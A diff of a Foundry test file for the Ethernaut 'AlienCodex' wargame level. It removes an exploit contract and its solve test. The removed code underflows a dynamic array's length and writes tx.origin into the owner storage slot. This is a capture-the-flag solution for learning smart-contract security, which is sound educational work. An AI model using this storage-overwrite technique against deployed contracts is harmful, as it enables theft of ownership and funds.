@@ -15,16 +15,6 @@ interface AlienCodex {
     function revise(uint256, bytes32) external;
 }
 
-contract AlienCodexExploit {
-    function exploit(address instanceAddress) public {
-        AlienCodex instance = AlienCodex(instanceAddress);
-        instance.makeContact();
-        instance.retract();
-        uint256 codexZeroIndex = uint256(keccak256(abi.encode(1)));
-        instance.revise(type(uint256).max - codexZeroIndex + 1, bytes32(uint256(uint160(tx.origin))));
-    }
-}
-
 contract TestAlienCodex is Test, Utils {
     Ethernaut ethernaut;
     AlienCodex instance;
@@ -64,14 +54,5 @@ contract TestAlienCodex is Test, Utils {
     function testInit() public {
         vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
-    }
-
-    /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player, player);
-
-        new AlienCodexExploit().exploit(address(instance));
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
 }
